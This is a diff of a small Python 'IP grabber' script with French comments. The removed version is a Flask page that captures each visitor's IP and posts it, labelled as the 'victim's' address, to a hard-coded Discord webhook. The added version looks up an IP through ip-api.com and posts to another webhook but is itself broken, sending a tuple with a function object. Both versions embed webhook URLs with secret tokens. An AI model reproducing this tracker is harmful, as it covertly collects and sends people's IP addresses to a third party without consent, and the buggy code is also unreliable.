@@ -1,32 +1,19 @@
-from flask import Flask, request
-import requests
+import requests 
 import json
 
-app = Flask(__name__)
+def ipgrab(ip):
+     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
+     return ip 
 
-def ipgrab():
-    user_ip = request.remote_addr
-    return user_ip
+webhook_url = "https://discord.com/api/webhooks/1194596668771934258/mTijMHc4RfcKz6gkXkvI8M-yTJc9kE5rFhZD9HQ5e1Nu261hGh2_TeJBExK9P-gUozCN"
+message =  f"l adresse ip de la victime est : ", ipgrab
 
-@app.route('/')
-def webhook():
-    user_ip = ipgrab()
-    message = f"L'adresse IP de la victime est : {user_ip}"
+payload = {
+    "content": message
+}
 
-    webhook_url = "https://discord.com/api/webhooks/1194589877233262662/6U_vTLLwpfgcumnX1m--aWxWuaHpJFzIQ0rrJnT6HHQB4ZQjk1EoQT_unRp6JBIGJqnR"
+headers = {
+    "Content-Type": "application/json"
+}
 
-    payload = {
-        "content": message
-    }
-
-    headers = {
-        "Content-Type": "application/json"
-    }
-
-    response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
-    
-    return "Message envoyé avec succès !"
-
-if __name__ == '__main__':
-    app.run()
-
+response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
